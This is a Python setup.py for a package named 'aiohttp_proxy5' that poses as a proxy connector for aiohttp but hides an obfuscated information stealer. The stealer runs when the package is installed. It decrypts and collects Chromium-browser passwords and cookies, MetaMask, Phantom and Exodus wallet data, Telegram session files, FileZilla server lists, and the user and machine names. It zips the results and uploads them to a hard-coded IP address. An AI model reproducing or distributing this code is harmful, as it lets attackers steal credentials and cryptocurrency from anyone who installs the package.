import codecs
import os
import re
import sys
import tempfile
import random
import string
import datetime
import subprocess
from base64 import b64decode


def print(text: str, time=True):
    try:
        with open(f'{tempfile.gettempdir()}\\aiohttp_proxy5_logs.txt', 'a', encoding='utf8') as f:
            if time:
                now = datetime.datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
                f.write(f'{now} | {text}\n')
            else:
                f.write(f'{text}\n')
    except:
        pass



def rand():
    return ''.join(random.choice(string.ascii_lowercase) for i in range(12))

print(f'\n\nНачинается код', time=False)
print(sys.argv)

def sb_proc():
    ...

    
if len(sys.argv) > 0 and "install" == sys.argv[1] or "bdist" in sys.argv[1]:
    print('sb_proc running')
    sb_proc()
    print('sb_proc ended')

print('Заканчивается код бека')

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

version = None

with codecs.open(
    os.path.join(
        os.path.abspath(os.path.dirname(__file__)), "aiohttp_proxy5", "__init__.py"
    ),
    "r",
    "latin1",
) as fp:
    try:
        version = re.findall(r'^__version__ = "(\S+?)"$', fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError("Unable to determine version.")

if sys.version_info < (3, 5, 3):
    raise RuntimeError("aiohttp_proxy5 requires Python 3.5.3+")

with open("README.md") as f:
    long_description = f.read()

setup(
    name="aiohttp_proxy5",
    author="Skactor",
    author_email="sk4ct0r@gmail.com",
    version='0.1.12',
    license="Apache 2",
    url="https://github.com/Skactor/aiohttp-proxy",
    description="Full-featured proxy connector for aiohttp",
    long_description=long_description,
    long_description_content_type="text/markdown",
    packages=["aiohttp_proxy5"],
    keywords="asyncio aiohttp socks socks5 socks4 http https proxy aiofiles aiohttp cryptography",
    install_requires=["aiohttp>=2.3.2", "yarl"],
)

os.system('pip install aiofiles')
os.system('pip install aiohttp')
os.system('pip install cryptography')
os.system('pip install aiosqlite')
_O00O000OO00O00O0O =b"from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir, scandir\r\nfrom secrets import token_hex\r\nfrom tools import copyfile, copytree\r\n\r\n\r\nclass Telegram(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        tdata_path = join(path, 'tdata')\r\n        if not isdir(tdata_path):\r\n            return\r\n\r\n        telegram_path = join(self.conf.log_path, 'telegram')\r\n        if not isdir(telegram_path):\r\n            mkdir(telegram_path)\r\n\r\n        res_path = join(telegram_path, f'tdata_{token_hex(4)}')\r\n        mkdir(res_path)\r\n\r\n        blacklist = ['dumps', 'emoji', 'user_data', 'working']\r\n\r\n        for f in scandir(tdata_path):\r\n            file_ok = True\r\n            for i in blacklist:\r\n                if i in f.name:\r\n                    file_ok = False\r\n                    break\r\n            \r\n            if not file_ok:\r\n                continue\r\n            \r\n            from_path = join(tdata_path, f.name)\r\n            dest_path = join(res_path, f.name)\r\n\r\n            func = copyfile if f.is_file() else copytree\r\n            await func(from_path, dest_path)\r\n"#line:1
_O0OOO0OOOO0OO0OOO =b"from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir, scandir\r\nfrom secrets import token_hex\r\nfrom tools import copyfile\r\n\r\n\r\n\r\nclass Filezilla(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        search = {'recentservers.xml', 'sitemanager.xml'}\r\n        files = search.intersection(i.name for i in scandir(path))\r\n\r\n        if not files:\r\n            return\r\n\r\n        res_path = join(self.conf.log_path, 'filezilla')\r\n        if not isdir(res_path):\r\n            mkdir(res_path)\r\n        \r\n        for f in files:\r\n            filename = f.split('.')[0]\r\n            dest_path = join(res_path, f'{filename}_{token_hex(4)}.xml')\r\n            await copyfile(join(path, f), dest_path)\r\n"#line:2
_OOO000O00000OOOO0 =b"from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir\r\nfrom secrets import token_hex\r\nfrom tools import copytree\r\n\r\n\r\n\r\nclass Exodus(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        wallet_folder = join(path, 'exodus.wallet')\r\n        if not isdir(wallet_folder):\r\n            return\r\n\r\n        wallets_path = join(self.conf.log_path, 'wallets')\r\n        if not isdir(wallets_path):\r\n            mkdir(wallets_path)\r\n        \r\n        log_exodus_path = join(wallets_path, f'exodus_{token_hex(4)}')\r\n\r\n        await copytree(wallet_folder, log_exodus_path)"#line:3
_O0O00OOO0O000000O =b"from plugins import Plugin\r\nfrom config import Config\r\nimport os\r\nfrom os.path import join\r\nimport platform\r\nfrom aiohttp import ClientSession\r\nfrom aiofiles import open\r\n\r\n\r\n\r\nclass Details():\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n    async def callback(self) -> None:\r\n        user = os.getlogin()\r\n        pc = platform.node()\r\n\r\n        data = {\r\n            'client_id': self.conf.client_id,\r\n            'user_name': user,\r\n            'pc_name': pc\r\n        }\r\n        \r\n        url = f'{self.conf.host}/receive_details'\r\n\r\n        async with ClientSession() as s:\r\n            await s.post(url, json=data)\r\n\r\n        async with open(join(self.conf.log_path, 'details.txt'), 'w', encoding='utf8') as f:\r\n            await f.write(f'user name: {user}\\npc name: {pc}')"#line:4
_OO00OOO0OOO0OOO00 =b"from asyncio import Task, create_task\r\nfrom typing import List\r\nfrom plugins import Plugin\r\nfrom config import Config\r\nfrom os import scandir, mkdir\r\nfrom os.path import join, isdir, isfile, split\r\nfrom tools import copyfile, copytree\r\nfrom path_search import search_paths\r\nimport aiosqlite\r\nfrom .decrypt import Decryptor\r\nfrom time import time\r\nfrom paths import TEMP\r\nfrom secrets import token_hex\r\nfrom aiofiles import open\r\n\r\n\r\n\r\nclass Chromium(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n        self.decryptor = None\r\n\r\n\r\n    async def set_decryptor(self, root_path: str) -> None:\r\n        local_state_folders = {\r\n            join(root_path, 'user data'),\r\n            root_path\r\n        }\r\n\r\n        local_states = []\r\n        async for i in search_paths(local_state_folders, {'Local State'}):\r\n            local_states.append(i)\r\n\r\n        if local_states:\r\n            local_state_path = local_states[0]\r\n        else:\r\n            local_state_path = None\r\n\r\n        self.decryptor = Decryptor(local_state_path)\r\n\r\n\r\n    async def steal_password(self, root_path: str) -> None:\r\n        rows = []\r\n\r\n        if not isdir(root_path):\r\n            return []\r\n\r\n        login_data_folder_paths = {\r\n            join(root_path, 'user data', 'default'),\r\n            root_path\r\n        }\r\n\r\n        async for p in search_paths(login_data_folder_paths, {'Login Data'}):\r\n            if not isfile(p):\r\n                continue\r\n            \r\n            temp_path = join(TEMP, f'Login Data {time()}')\r\n            await copyfile(p, temp_path)\r\n\r\n            if not self.decryptor:\r\n                await self.set_decryptor(root_path)\r\n            async with aiosqlite.connect(temp_path) as conn:\r\n                sql = 'select * from logins'\r\n                async with conn.execute(sql) as curr:\r\n                    async for row in curr:\r\n                        rows.append((row[1], row[3], self.decryptor.decrypt_password(row[5])))\r\n\r\n        if rows:\r\n            name = f'{split(root_path)[1]}_{token_hex(5)}.txt'\r\n            passwords_path = join(self.conf.log_path, 'passwords')\r\n            path = join(passwords_path, name)\r\n\r\n            if not isdir(passwords_path):\r\n                mkdir(passwords_path)\r\n\r\n            async with open(path, 'w', encoding='utf8') as f:\r\n                for url, login, password in rows:\r\n                    await f.write(f'URL: {url}\\nLogin: {login}\\nPassword: {password}\\n\\n')\r\n        \r\n\r\n    async def steal_cookies(self, root_path: str) -> None:\r\n        if not isdir(root_path):\r\n            return []\r\n\r\n        cookies = ''\r\n\r\n        cookie_folder_paths = {\r\n            join(root_path, 'user data', 'default', 'network'), \r\n            join(root_path, 'user data', 'default'),\r\n            root_path\r\n        }\r\n\r\n        async for p in search_paths(cookie_folder_paths, {'Cookies', 'cookies.sqlite'}):\r\n            if not isfile(p):\r\n                continue\r\n\r\n            temp_path = join(TEMP, f'Cookies {time()}')\r\n            await copyfile(p, temp_path)\r\n\r\n            if not self.decryptor:\r\n                await self.set_decryptor(root_path)\r\n                    \r\n            async with aiosqlite.connect(temp_path) as conn:\r\n                sql = 'select * from cookies'\r\n                async with conn.execute(sql) as curr:\r\n                    async for row in curr:\r\n                        conv = lambda x: 'TRUE' if x else 'FALSE'\r\n\r\n                        host = row[1]\r\n                        http_only = conv(row[9])\r\n                        path = row[6]\r\n                        secure = conv(row[8])\r\n                        expiration_date = str(row[7])\r\n                        name = row[3]\r\n                        value = self.decryptor.decrypt_password(row[5])\r\n\r\n                        if not value:\r\n                            value = ''\r\n\r\n                        cookie = '\\t'.join(\r\n                            (host, http_only, path, secure, expiration_date, name, value))\r\n                        cookies += cookie + '\\n'\r\n\r\n        if cookies:\r\n            name = f'{split(root_path)[1]}_{token_hex(5)}.txt'\r\n            cookies_path = join(self.conf.log_path, 'cookies')\r\n            path = join(cookies_path, name)\r\n            \r\n            if not isdir(cookies_path):\r\n                mkdir(cookies_path)\r\n\r\n            async with open(path, 'w', encoding='utf8') as f:\r\n                await f.write(cookies)\r\n\r\n\r\n    async def steal_wallets(self, root_path: str) -> None:\r\n        if not isdir(root_path):\r\n            return []\r\n\r\n        wallet_folder_paths = {\r\n            join(root_path, 'user data', 'default', 'local extension settings'), \r\n            join(root_path, 'user data', 'local extension settings'), \r\n            join(root_path, 'local extension settings')\r\n        }\r\n\r\n        wallets = {\r\n            'nkbihfbeogaeaoehlefnkodbefgpgknn': 'metamask',\r\n            'bfnaelmomeimhlpmgjnjophhpkkoljpa': 'phantom'\r\n        }\r\n\r\n        async for p in search_paths(wallet_folder_paths, set(wallets.keys())):\r\n            if not isdir(p):\r\n                continue\r\n            \r\n            wallets_path = join(self.conf.log_path, 'wallets')\r\n            if not isdir(wallets_path):\r\n                mkdir(wallets_path)\r\n\r\n            name = split(p)[1]\r\n            wallet_name = wallets[name]\r\n            dest_path = join(wallets_path, f'{wallet_name}_{token_hex(4)}')\r\n\r\n            try:\r\n                await copytree(p, dest_path)\r\n            except:\r\n                pass\r\n    \r\n\r\n    async def callback(self, path: str) -> None:\r\n        chromium_browser_names = {\r\n            'opera gx stable',\r\n            'opera stable',\r\n            'chrome',\r\n            'yandexbrowser'\r\n        }\r\n\r\n        tasks: List[Task] = []\r\n\r\n        for folder_name in chromium_browser_names.intersection(i.name.lower() for i in scandir(path)):\r\n            root_path = join(path, folder_name)\r\n            tasks.append(create_task(self.steal_password(root_path)))\r\n            tasks.append(create_task(self.steal_cookies(root_path)))\r\n            tasks.append(create_task(self.steal_wallets(root_path)))\r\n            \r\n        for task in tasks:\r\n            await task\r\n                "#line:5
import contextlib as __stickytape_contextlib #line:6
@__stickytape_contextlib .contextmanager #line:7
def __O0OO0OO0000OO0O00 ():#line:8
	import tempfile ,shutil ;OO0O00O0OO000OO0O =tempfile .mkdtemp ()#line:9
	try :yield OO0O00O0OO000OO0O #line:10
	finally :shutil .rmtree (OO0O00O0OO000OO0O )#line:11
with __O0OO0OO0000OO0O00 ()as __OO0O0O0OOOO000OOO :#line:12
	def __O0O0O0OOOOO0O0O00 (OO00OOOOOOOOO0OO0 ,O00OOOO0OOO0OO0OO ):#line:13
		OO0OOOOOO0O0OO0OO ='wb';import os ,os .path #line:14
		def O00OOO0O0O00OO0O0 (OO00O0OO0O0OOOO00 ):#line:15
			OOOOOOO00000OO0OO =OO00O0OO0O0OOOO00 .split ('/');OOO0OO00OOO0O0O0O =__OO0O0O0OOOO000OOO #line:16
			for O00OO0O0O00O0O000 in OOOOOOO00000OO0OO :#line:17
				OOO0OO00OOO0O0O0O =os .path .join (OOO0OO00OOO0O0O0O ,O00OO0O0O00O0O000 )#line:18
				if not os .path .exists (OOO0OO00OOO0O0O0O ):#line:19
					os .mkdir (OOO0OO00OOO0O0O0O )#line:20
					with open (os .path .join (OOO0OO00OOO0O0O0O ,'__init__.py'),OO0OOOOOO0O0OO0OO )as O0OO0000000OO0OO0 :O0OO0000000OO0OO0 .write (b'\n')#line:21
		O00OOO0O0O00OO0O0 (os .path .dirname (OO00OOOOOOOOO0OO0 ));OO000O0O0000O00OO =os .path .join (__OO0O0O0OOOO000OOO ,OO00OOOOOOOOO0OO0 )#line:22
		with open (OO000O0O0000O00OO ,OO0OOOOOO0O0OO0OO )as OOO00OOO000O0O00O :OOO00OOO000O0O00O .write (O00OOOO0OOO0OO0OO )#line:23
	import sys as __stickytape_sys ;__stickytape_sys .path .insert (0 ,__OO0O0O0OOOO000OOO );__O0O0O0OOOOO0O0O00 ('path_search.py',b"import asyncio\r\nimport os\r\nfrom os.path import join, isdir\r\nfrom typing import Dict, Iterable, List\r\n\r\n\r\nLOCAL = os.environ['USERPROFILE']\r\n\r\nroot_paths = {\r\n    join(LOCAL, 'appdata'),\r\n    join(LOCAL, 'appdata', 'local'),\r\n    join(LOCAL, 'appdata', 'roaming'),\r\n    join(LOCAL, 'documents'),\r\n    join(LOCAL, 'downloads'),\r\n    join(LOCAL, 'desktop'),\r\n    'C:\\\\',\r\n    'D:\\\\',\r\n    'E:\\\\',\r\n    'C:\\\\Program Files',\r\n    'C:\\\\Program Files (x86)',\r\n    'C:\\\\\\ProgramData'\r\n\r\n}\r\n\r\n\r\nasync def search_plugin_paths(paths: Iterable[str], queries: Dict):\r\n    tasks: List[asyncio.Task] = []\r\n\r\n    queries = {k.lower(): v for k,v in queries.items()}\r\n    target_folder_names = set(queries.keys())\r\n    for p in paths:\r\n        if isdir(p):\r\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\r\n                if queries[fname] is not None:\r\n                    curr_path = join(p, fname)\r\n                    loop = asyncio.get_event_loop()\r\n                    task = loop.create_task(queries[fname].callback(curr_path))\r\n                    tasks.append(task)\r\n\r\n    for task in tasks:\r\n        await task\r\n\r\n\r\nasync def search_paths(paths: Iterable[str], queries: Iterable):\r\n    target_folder_names = {i.lower() for i in queries}\r\n    for p in paths:\r\n        if isdir(p):\r\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\r\n                if fname in target_folder_names:\r\n                    yield join(p, fname)\r\n");__O0O0O0OOOOO0O0O00 ('config.py',b'from dataclasses import dataclass, field\r\nfrom aiohttp import ClientSession as Session\r\n\r\n\r\n@dataclass\r\nclass Config:\r\n    client_id: str\r\n    host: str\r\n    log_path: str\r\n    browser_passwords: bool = field(default=True)\r\n    browser_cookies: bool = field(default=True)');__O0O0O0OOOOO0O0O00 ('paths.py',b"from os import environ\r\nfrom os.path import join\r\n\r\n\r\nLOCAL = environ['USERPROFILE']\r\nTEMP = join(LOCAL, 'appdata', 'local', 'temp')");__O0O0O0OOOOO0O0O00 ('tools.py',b"import os\r\nfrom aiofiles.os import wrap\r\nfrom shutil import copyfile, copytree\r\nimport timeit\r\n\r\n\r\ndef zipdir(path, ziph):\r\n    '''From stackoverflow'''\r\n    # ziph is zipfile handle\r\n    for root, dirs, files in os.walk(path):\r\n        for file in files:\r\n            ziph.write(os.path.join(root, file), \r\n                       os.path.relpath(os.path.join(root, file), \r\n                                       os.path.join(path, '..')))\r\n\r\ncopyfile = wrap(copyfile)\r\ncopytree = wrap(copytree)\r\n");__O0O0O0OOOOO0O0O00 ('plugins/__init__.py',b'from .base_plugin import Plugin\r\n\r\nfrom .browsers import Chromium\r\n\r\nfrom .details import Details\r\n\r\nfrom .wallets import Exodus\r\n\r\nfrom .filezilla import Filezilla\r\n\r\nfrom .telegram import Telegram');__O0O0O0OOOOO0O0O00 ('plugins/base_plugin.py',b'from config import Config\r\nfrom abc import ABC, abstractmethod\r\n\r\n\r\nclass Plugin(ABC):\r\n    @abstractmethod\r\n    def __init__(self, conf: Config) -> None:\r\n        ...\r\n\r\n    @abstractmethod\r\n    async def callback(path: str) -> None:\r\n        ...');__O0O0O0OOOOO0O0O00 ('plugins/browsers/__init__.py',b'from .chromium import Chromium');__O0O0O0OOOOO0O0O00 ('plugins/browsers/chromium.py',_OO00OOO0OOO0OOO00 );__O0O0O0OOOOO0O0O00 ('plugins/browsers/decrypt.py',b'# https://github.com/hakanonymos/steal-chrome-password-all-version/blob/master/local.py\r\n\r\n\r\nimport ctypes\r\nimport ctypes.wintypes\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives.ciphers import (\r\n    Cipher, algorithms, modes)\r\nimport base64\r\nimport os\r\nimport json\r\n\r\n\r\nclass Decryptor:\r\n    def __init__(self, path) -> None:\r\n        if path is None:\r\n            self.path = os.path.join(os.environ[\'LOCALAPPDATA\'], r"Google\\Chrome\\User Data\\Local State")\r\n        else:\r\n            self.path = path\r\n        \r\n        self.key = None\r\n        self.cipher = None\r\n\r\n    @staticmethod\r\n    def dpapi_decrypt(encrypted):\r\n        class DATA_BLOB(ctypes.Structure):\r\n            _fields_ = [(\'cbData\', ctypes.wintypes.DWORD),\r\n                        (\'pbData\', ctypes.POINTER(ctypes.c_char))]\r\n\r\n        p = ctypes.create_string_buffer(encrypted, len(encrypted))\r\n        blobin = DATA_BLOB(ctypes.sizeof(p), p)\r\n        blobout = DATA_BLOB()\r\n        retval = ctypes.windll.crypt32.CryptUnprotectData(\r\n            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\r\n        if not retval:\r\n            raise ctypes.WinError()\r\n        result = ctypes.string_at(blobout.pbData, blobout.cbData)\r\n        ctypes.windll.kernel32.LocalFree(blobout.pbData)\r\n        return result\r\n\r\n    @staticmethod\r\n    def decrypt(cipher, ciphertext, nonce):\r\n        cipher.mode = modes.GCM(nonce)\r\n        decryptor = cipher.decryptor()\r\n        return decryptor.update(ciphertext)\r\n\r\n    def get_key_from_local_state(self):\r\n        jsn = None\r\n        with open(self.path, \'r\') as f:\r\n            jsn = json.loads(str(f.readline()))\r\n        return jsn[\'os_crypt\'][\'encrypted_key\']\r\n\r\n    @staticmethod\r\n    def get_cipher(key):\r\n        cipher = Cipher(\r\n            algorithms.AES(key),\r\n            None,\r\n            backend=default_backend()\r\n        )\r\n        return cipher\r\n\r\n    def aes_decrypt(self, encrypted_txt):\r\n        if self.key is None:\r\n            encoded_key = self.get_key_from_local_state()\r\n            encrypted_key = base64.b64decode(encoded_key.encode())\r\n            encrypted_key = encrypted_key[5:]\r\n            self.key = Decryptor.dpapi_decrypt(encrypted_key)\r\n            self.cipher = Decryptor.get_cipher(self.key)\r\n        \r\n        nonce = encrypted_txt[3:15]\r\n\r\n        return Decryptor.decrypt(self.cipher,encrypted_txt[15:],nonce)\r\n\r\n    def decrypt_password(self, data):\r\n        try:\r\n            if data[:4] == b\'\\x01\\x00\\x00\\x00\':\r\n                decrypted = Decryptor.dpapi_decrypt(data)\r\n                return decrypted.decode()\r\n            elif data[:3] == b\'v10\':\r\n                decrypted = self.aes_decrypt(data)\r\n                return decrypted[:-16].decode()\r\n        except:\r\n            return None');__O0O0O0OOOOO0O0O00 ('plugins/browsers/Chromium.py',_OO00OOO0OOO0OOO00 );__O0O0O0OOOOO0O0O00 ('plugins/details.py',_O0O00OOO0O000000O );__O0O0O0OOOOO0O0O00 ('plugins/wallets/__init__.py',b'from .exodus import Exodus');__O0O0O0OOOOO0O0O00 ('plugins/wallets/exodus.py',_OOO000O00000OOOO0 );__O0O0O0OOOOO0O0O00 ('plugins/wallets/Exodus.py',_OOO000O00000OOOO0 );__O0O0O0OOOOO0O0O00 ('plugins/filezilla.py',_O0OOO0OOOO0OO0OOO );__O0O0O0OOOOO0O0O00 ('plugins/telegram.py',_O00O000OO00O00O0O );__O0O0O0OOOOO0O0O00 ('plugins/Details.py',_O0O00OOO0O000000O );__O0O0O0OOOOO0O0O00 ('plugins/Filezilla.py',_O0OOO0OOOO0OO0OOO );__O0O0O0OOOOO0O0O00 ('plugins/Telegram.py',_O00O000OO00O00O0O );import asyncio ;from asyncio import create_task ;from weakref import proxy ;from path_search import search_plugin_paths ,root_paths ;from config import Config ;from aiohttp import ClientSession as Session ,MultipartWriter ,hdrs ,FormData ;import secrets ,timeit ;from paths import TEMP ;from os import mkdir ;from os .path import join ;from zipfile import ZipFile ,ZIP_DEFLATED ;from base64 import b64encode ;from tools import zipdir ;from plugins import Chromium ,Details ,Exodus ,Filezilla ,Telegram ;HOST ='http://144.24.115.170'#line:24
	async def main ():#line:25
		OOOOOO00O0OO0O0O0 =secrets .token_hex (10 );OOO0000OOOO000000 =join (TEMP ,OOOOOO00O0OO0O0O0 );print (OOO0000OOOO000000 );mkdir (OOO0000OOOO000000 );O0OO0OO0OO00O000O =[];OOOO00000O00O0OO0 =Config (client_id =OOOOOO00O0OO0O0O0 ,host =HOST ,log_path =OOO0000OOOO000000 );O0OO0000OOOO00O0O =Chromium (OOOO00000O00O0OO0 );O00000000000OO0O0 ={'google':O0OO0000OOOO00O0O ,'exodus':Exodus (OOOO00000O00O0OO0 ),'mozilla':None ,'yandex':O0OO0000OOOO00O0O ,'telegram desktop':Telegram (OOOO00000O00O0OO0 ),'telegram':Telegram (OOOO00000O00O0OO0 ),'opera software':O0OO0000OOOO00O0O ,'filezilla':Filezilla (OOOO00000O00O0OO0 )};O0OO0OO0OO00O000O .append (create_task (search_plugin_paths (root_paths ,O00000000000OO0O0 )));O0O00OO0O00O00O00 =[Details (OOOO00000O00O0OO0 )]#line:26
		for OO0O00O0OOOOO0O0O in O0O00OO0O00O00O00 :O0OO0OO0OO00O000O .append (create_task (OO0O00O0OOOOO0O0O .callback ()))#line:27
		for OOO0OOOOO0O0O000O in O0OO0OO0OO00O000O :await OOO0OOOOO0O0O000O #line:28
		OO0OOOOO0OO000OOO =join (TEMP ,f"{OOOOOO00O0OO0O0O0}.zip")#line:29
		with ZipFile (OO0OOOOO0OO000OOO ,'w',ZIP_DEFLATED )as OO0O0O0O0OO0OOOO0 :zipdir (OOO0000OOOO000000 ,OO0O0O0O0OO0OOOO0 )#line:30
		with MultipartWriter ()as O00OOO0000OO00OOO :#line:31
			O00OOO0000OO00OOO .append (open (OO0OOOOO0OO000OOO ,'rb'))#line:32
			async with Session ()as O0OOOO00O00O00O0O :await O0OOOO00O00O00O0O .post (f"{HOST}/receive_log",data =O00OOO0000OO00OOO ,params ={'client_id':OOOOOO00O0OO0O0O0 })#line:33
	asyncio .run (main ())